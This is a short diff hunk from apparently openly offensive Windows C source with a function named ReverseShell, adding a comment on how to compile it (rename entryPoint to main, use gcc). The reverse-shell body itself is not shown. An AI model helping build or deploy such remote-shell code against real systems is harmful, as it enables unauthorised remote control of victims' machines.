@@ -31,6 +31,6 @@ void ReverseShell() {
     WaitForSingleObject(pi.hProcess, INFINITE);
 }
 
-int entryPoint() {
+int entryPoint() { // Note: This will not work, in order to compile this copy this code, change entryPoint to main, and use gcc or something.
     ReverseShell();
 }
